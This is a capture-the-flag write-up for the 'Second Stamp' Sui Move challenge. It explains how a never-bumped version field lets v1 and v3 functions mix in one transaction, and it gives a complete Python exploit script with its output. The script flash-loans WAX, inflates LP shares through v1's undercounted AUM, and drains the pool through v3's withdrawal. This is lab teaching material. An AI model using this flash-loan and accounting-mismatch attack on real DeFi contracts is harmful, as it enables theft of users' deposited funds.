# Second Stamp
**Author:** Mohammed Ali  


## Summary

A Sui Move DeFi protocol ("Sharehouse") was upgraded across three package versions (v1, v2, v3) but the shared `Versioned` object's `version` field was never bumped from `1`. Because both v1's `assert_supported` (`version <= 1`) and v3's (`version <= 3`) accept `version == 1`, an attacker can call v1's `refresh_aum` (which omits the travel-counter position from AUM) to produce a tiny denominator, then deposit flash-loaned WAX into v1 (no safety margin) to mint a dominant LP share, and finally withdraw through v3's full profile-3 flow that includes travel-counter claims — draining all protocol assets across two rounds.

## Solution

### Step 1 — Identify the version-bump bug

Three package versions exist (`v1`, `v2`, `v3`) each with their own `sharehouse::versioned` module. The shared `Versioned` object is created once in `v1::versioned::new` with `version: 1`:

```move
public fun new(ctx: &mut TxContext): Versioned {
    Versioned { id: object::new(ctx), version: 1 }
}
```

Although the protocol was upgraded v1→v2→v3, `versioned::set_version` was never called to bump `version` past `1`. Each version's `assert_supported` checks `versioned.version <= SUPPORTED_VERSION`:

- **v1** `SUPPORTED_VERSION = 1` → `1 <= 1` → **passes**
- **v3** `SUPPORTED_VERSION = 3` → `1 <= 3` → **passes**

This means all three versions' logic is simultaneously callable in the same transaction.

### Step 2 — Spot the AUM mismatch between v1 and v3

**v1 `calculate_aum`** (accounting.move:12-28) only includes the **old-counter position** + buffer:

```move
math::base_value_in_quote(position_base + buffer_base, price)
    + ((position_quote + buffer_quote) as u128)
```

**v3 `calculate_aum`** (accounting.move:12-35) additionally includes the **travel-counter position**:

```move
math::base_value_in_quote_q18_floor(
    old_counter_base + travel_counter_base + buffer_base, price
) + ((old_counter_quote + travel_counter_quote + buffer_quote) as u128)
```

### Step 3 — Confirm deposit lacks safety margin in v1

**v1 `deposit`** uses `last_aum` directly as the LP-mint denominator:

```move
let denominator = sharehouse::last_aum(house);
deposit_with_denominator(house, config, base_payment, quote_payment, denominator, 1, ctx)
```

**v3 `deposit`** applies a safety margin multiplier to inflate the denominator:

```move
let denominator = math::mul_div_floor(
    sharehouse::last_aum(house),
    (config::aum_safety_margin_ppb(config) + margin_denominator) as u128,
    margin_denominator as u128
);
```

### Step 4 — Build the exploit chain

The win condition (`is_solved` in setup.move:102-124) requires all protocol-held asset balances (buffer, fees, old-counter, travel-counter) to fall below residual limits. Two rounds of the following sequence achieve this:

1. **Flash loan 20×10¹⁵ WAX** from the v3 buffer (`flash_loan_base`). The player is the configured keeper. This empties the entire WAX buffer.
2. **Call v1 `refresh_aum`** — because v1 omits the travel-counter position and the buffer WAX was just drained, AUM collapses to a tiny value (~1,002,500 quote units, only old-counter dust).
3. **Call v1 `deposit`** with the flash-loaned WAX + the starting gold fleck. With the tiny denominator and no safety margin, this mints ~299M LP tokens out of ~6M initial supply — the attacker now holds ~98% of all LP.
4. **Call v3 `new_withdraw_cert`** (profile=3) to start a full withdrawal that includes the travel-counter.
5. **Process all withdrawal legs**: `process_old_counter`, `withdraw_travel_counter`, `collect_position_fees`, `collect_position_rewards`, `process_buffer`. Each pulls a proportional share based on the attacker's dominant LP holding.
6. **`complete_withdraw`** returns the accumulated WAX and GOLD coins.
7. **Repay the flash loan**: split `20_018_000_000_000_000` WAX (principal + 9 bps fee at `ceil(20×10¹⁵ × 9 / 10000)`) from the withdrawn WAX and call `repay_flash_loan_base`.
8. **Transfer** the remaining WAX and all GOLD to the player.

After two rounds, every protocol position (buffer, fees, old-counter, travel-counter) is drained below the residual limits and `POST /api/instance/check` returns the flag.

### Step 5 — Implementation via gRPC (not JSON-RPC)

The challenge exposes a Sui gRPC endpoint (HTTP/2 cleartext). JSON-RPC returns 404. We use `pysui`'s gRPC client with a monkey-patch to support plain HTTP, build the transaction with a low-level `ProgrammableTransactionBuilder(compress_inputs=False)` (to control shared-object mutability precisely), sign it, and submit via `ExecuteTransaction`.

Key implementation details:
- Shared objects (house, config, versioned, pools, oracle) are registered as **mutable** so they can serve both `&T` and `&mut T` parameters; `Clock` (0x6) is registered as **immutable**.
- Coin queries after Round 1 use the full type `0x2::coin::Coin<0x…::pale_wax::PALE_WAX>` (not the bare inner type) — the gRPC `ListOwnedObjectsRequest.object_type` filter requires the complete Move type string.
- In Round 2, coins from Round 1 are fetched as objects and registered as `ImmOrOwnedObject` inputs (not pure values) since `deposit` expects `Coin<T>` object arguments.

```python
#!/usr/bin/env python3
"""Second Stamp exploit — drains Sharehouse via cross-version AUM mismatch."""

import asyncio, json, base64, os
from urllib.parse import urlparse
import httpx

# Monkey-patch pysui to support HTTP (not just HTTPS) for gRPC
import pysui.sui.sui_grpc.pgrpc_clients as pc
def _patched_init(self, *, pysui_config, default_header=None):
    from grpclib.client import Channel
    self._pysui_config = pysui_config
    self._default_header = default_header or {}
    parsed = urlparse(pysui_config.active_group.active_profile.url)
    self._channel = Channel(
        host=parsed.hostname, port=parsed.port or 50051,
        ssl=(parsed.scheme == 'https'))
    self._channels = []
    self._protocol_config = None
pc.GrpcProtocolClient.__init__ = _patched_init

HOST_BASE = "ip:port"  # <-- change per instance
FLASH_AMOUNT = 20_000_000_000_000_000
FLASH_REPAY = 20_018_000_000_000_000  # principal + ceil(20e15 * 9/10000)

from pysui.sui.sui_bcs import bcs
from pysui.sui.sui_common.txn_transaction_builder import ProgrammableTransactionBuilder
from pysui.sui.sui_common.txn_pure import PureInput
from pysui.sui.sui_grpc.pgrpc_requests import GetCoins, GetObjectSC, ExecuteTransaction
import pysui.sui.sui_common.sui_commands as cmd


async def setup_pysui(player_addr, suipriv):
    import pysui.sui.sui_crypto as crypto
    kp = crypto.keypair_from_keystring(suipriv)
    config_dir = "/tmp/pysui_exploit"
    os.makedirs(config_dir, exist_ok=True)
    config = {
        "version": "1.1.0", "sui_binary": "",
        "group_active": "grp", "groups": [{
            "group_name": "grp", "using_profile": "c", "using_address": player_addr,
            "alias_list": [], "key_list": [{"private_key_base64": base64.b64encode(kp.serialize_to_bytes()).decode()}],
            "address_list": [player_addr],
            "profiles": [{"profile_name": "c", "url": f"http://{HOST_BASE}", "faucet_url": None, "faucet_status_url": None}],
            "protocol": 2}]
    }
    with open(f"{config_dir}/PysuiConfig.json", "w") as f:
        json.dump(config, f)
    from pysui import PysuiConfiguration
    from pysui.sui.sui_common.factory import client_factory
    from pysui.sui.sui_common.config.confgroup import GroupProtocol
    pc_cfg = PysuiConfiguration(from_cfg_path=config_dir, group_name="grp")
    return client_factory(pc_cfg, protocol=GroupProtocol.GRPC)


async def get_coins(client, addr, coin_type):
    r = await client.execute_grpc_request(request=GetCoins(owner=addr, coin_type=coin_type))
    return r.result_data.objects if r.is_ok() else []


async def fetch_obj(client, oid):
    r = await client.execute_grpc_request(request=GetObjectSC(object_id=oid))
    if not r.is_ok():
        raise ValueError(f"fetch {oid}: {r.result_string}")
    return r.result_data


def reg_obj(builder, obj, force_mut=None):
    addr = bcs.Address.from_str(obj.object_id)
    owner = obj.owner
    kind = owner.kind.name if owner.kind else "UNKNOWN"
    if kind == "SHARED":
        is_mut = force_mut if force_mut is not None else True
        ref = bcs.SharedObjectReference(addr, int(owner.version), is_mut)
        oarg = bcs.ObjectArg("SharedObject", ref)
    else:
        oref = bcs.ObjectReference(addr, int(obj.version), bcs.Digest.from_str(obj.digest))
        oarg = bcs.ObjectArg("ImmOrOwnedObject", oref)
    return builder.input_obj(bcs.BuilderArg("Object", addr), oarg)


def pure(builder, val):
    return builder.input_pure(PureInput.as_input(val))


async def execute_round(client, addr, pkg, obj, chal_id, wax_id=None, gold_id=None):
    b = ProgrammableTransactionBuilder(compress_inputs=False)
    so = {}
    for n in ["house", "config", "versioned", "oldCounterPool", "travelCounterPool", "oracle"]:
        so[n] = await fetch_obj(client, obj[n])
    clk = await fetch_obj(client, "0x6")
    chal = await fetch_obj(client, chal_id)

    house = reg_obj(b, so["house"])
    config = reg_obj(b, so["config"])
    versioned = reg_obj(b, so["versioned"])
    old_pool = reg_obj(b, so["oldCounterPool"])
    travel_pool = reg_obj(b, so["travelCounterPool"])
    oracle = reg_obj(b, so["oracle"])
    clock = reg_obj(b, clk, force_mut=False)
    challenge = reg_obj(b, chal)

    # Step 1: claim (round 1 only)
    if wax_id is None:
        wax_arg, gold_arg = b.move_call(
            target=bcs.Address.from_str(pkg), module="setup", function="claim",
            type_arguments=[], arguments=[challenge], res_count=2)
        b.transfer_objects(
            recipient=pure(b, bytes.fromhex(addr.removeprefix("0x").zfill(64))),
            object_ref=[wax_arg])
    else:
        gold_arg = None

    # Step 2: flash loan 20e15 WAX
    flash_wax, flash_rcpt = b.move_call(
        target=bcs.Address.from_str(obj["v3"]), module="flash", function="flash_loan_base",
        type_arguments=[],
        arguments=[house, config, versioned, pure(b, FLASH_AMOUNT.to_bytes(8, 'little'))],
        res_count=2)

    # Step 3: v1 refresh_aum (omits travel-counter -> tiny AUM)
    b.move_call(
        target=bcs.Address.from_str(obj["v1"]), module="accounting", function="refresh_aum",
        type_arguments=[], arguments=[house, versioned, old_pool, oracle, clock], res_count=0)

    # Step 4: v1 deposit (no safety margin -> oversized LP)
    if gold_arg is not None:
        deposit_coin = gold_arg
    else:
        gold_obj = await fetch_obj(client, gold_id)
        deposit_coin = reg_obj(b, gold_obj)
    lp = b.move_call(
        target=bcs.Address.from_str(obj["v1"]), module="accounting", function="deposit",
        type_arguments=[], arguments=[house, config, versioned, flash_wax, deposit_coin], res_count=1)

    # Step 5: v3 new_withdraw_cert (profile=3, includes travel-counter)
    rcpt = b.move_call(
        target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="new_withdraw_cert",
        type_arguments=[], arguments=[house, config, versioned, lp], res_count=1)

    # Steps 6-10: process all withdrawal legs
    b.move_call(target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="process_old_counter",
                type_arguments=[], arguments=[house, rcpt, old_pool], res_count=0)
    b.move_call(target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="withdraw_travel_counter",
                type_arguments=[], arguments=[house, rcpt, travel_pool], res_count=0)
    b.move_call(target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="collect_position_fees",
                type_arguments=[], arguments=[house, rcpt, old_pool, travel_pool], res_count=0)
    b.move_call(target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="collect_position_rewards",
                type_arguments=[], arguments=[house, rcpt, old_pool, travel_pool], res_count=0)
    b.move_call(target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="process_buffer",
                type_arguments=[], arguments=[house, rcpt], res_count=0)

    # Step 11: complete_withdraw -> (wax_out, gold_out)
    wax_out, gold_out = b.move_call(
        target=bcs.Address.from_str(obj["v3"]), module="withdraw", function="complete_withdraw",
        type_arguments=[], arguments=[house, rcpt], res_count=2)

    # Step 12: repay flash loan (split from wax_out)
    repay = b.split_coin(from_coin=wax_out, amounts=[pure(b, FLASH_REPAY.to_bytes(8, 'little'))])
    b.move_call(target=bcs.Address.from_str(obj["v3"]), module="flash", function="repay_flash_loan_base",
                type_arguments=[], arguments=[house, flash_rcpt, repay], res_count=0)

    # Step 13: transfer remaining to self
    b.transfer_objects(
        recipient=pure(b, bytes.fromhex(addr.removeprefix("0x").zfill(64))),
        object_ref=[wax_out, gold_out])

    # Build, sign, submit
    tx_kind = b.finish_for_inspect()
    from pysui.sui.sui_common.txn_gas import async_get_gas_data
    from pysui.sui.sui_common.txn_signing import SignerBlock
    signer = SignerBlock(sender=addr)
    epoch_r = await client.execute(command=cmd.GetBasicCurrentEpochInfo(), timeout=30.0)
    chain_r = await client.execute(command=cmd.GetChainIdentifier(), timeout=30.0)
    epoch, chain_id = epoch_r.result_data, chain_r.result_data
    gas_data = await async_get_gas_data(
        signing=signer, client=client, budget=10_000_000_000, use_coins=None,
        objects_in_use=set(b.objects_registry.keys()), active_gas_price=epoch.reference_gas_price,
        tx_kind=tx_kind, gas_source_draw=0)
    tx_data = bcs.TransactionData("V1", bcs.TransactionDataV1(
        tx_kind, bcs.Address.from_str(addr), gas_data,
        bcs.TransactionExpiration.gen_valid_during_expiration(epoch.epoch, epoch.epoch + 1, chain_id)))
    tx_bytes = base64.b64encode(tx_data.serialize()).decode()
    sigs = signer.get_signatures(config=client.config, tx_bytes=tx_bytes)
    result = await client.execute_grpc_request(
        request=ExecuteTransaction(tx_bytestr=tx_bytes, sig_array=sigs))
    if result.is_ok():
        d = result.result_data
        print(f"[+] TX: {d.digest} | {d.effects.status}")
        return d.digest
    print(f"[-] FAIL: {result.result_string}")
    return None


async def main():
    async with httpx.AsyncClient(timeout=30) as http:
        r = await http.post(f"http://{HOST_BASE}/api/instance/start")
        data = r.json()
        if "deployment" not in data:
            r = await http.get(f"http://{HOST_BASE}/api/instance")
            data = r.json()
        dep = data["deployment"]
    addr, suipriv = dep["playerAddress"], dep["playerPrivateKey"]
    pkg, chal_id, obj = dep["packageId"], dep["challengeObjectId"], dep["objectIds"]
    print(f"[+] Player: {addr}")
    client = await setup_pysui(addr, suipriv)

    print("\n=== ROUND 1 ===")
    if not await execute_round(client, addr, pkg, obj, chal_id):
        return

    print("\n=== ROUND 2 ===")
    cp = obj["claimMarksPackage"]
    wax_type = f"0x2::coin::Coin<{cp}::pale_wax::PALE_WAX>"
    gold_type = f"0x2::coin::Coin<{cp}::gold_fleck::GOLD_FLECK>"
    wax_coins = await get_coins(client, addr, wax_type)
    gold_coins = await get_coins(client, addr, gold_type)
    print(f"[+] WAX: {len(wax_coins)}, GOLD: {len(gold_coins)}")
    if not wax_coins or not gold_coins:
        print("[-] No coins for round 2!")
        return
    if not await execute_round(client, addr, pkg, obj, chal_id,
                               wax_id=wax_coins[0].object_id, gold_id=gold_coins[0].object_id):
        return

    print("\n=== CHECK ===")
    async with httpx.AsyncClient(timeout=30) as http:
        r = await http.post(f"http://{HOST_BASE}/api/instance/check")
        print(json.dumps(r.json(), indent=2))


if __name__ == "__main__":
    asyncio.run(main())
```

### Output

```
=== ROUND 1 ===
[+] TX: 5Px6nG4ZXovTA2zbqK4pgL81bCXUf4H4aL53Cx7pXT5y | ExecutionStatus(success=True)

=== ROUND 2 ===
[+] WAX: 2, GOLD: 1
[+] TX: 65AYtZ5g6ZWWCntag1YAjHNcxnoDdPJvwhNdduYc28PP | ExecutionStatus(success=True)

=== CHECK ===
{
  "solved": true,
  "flag": "HTB{w1th_gr34t_upgr4d34b1l1ty_c0m3s_gr34t_cr0ss-v3rs10n_r1sk_3c2534f25dafe38237116bd48b2518fb}"
}
```
### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon



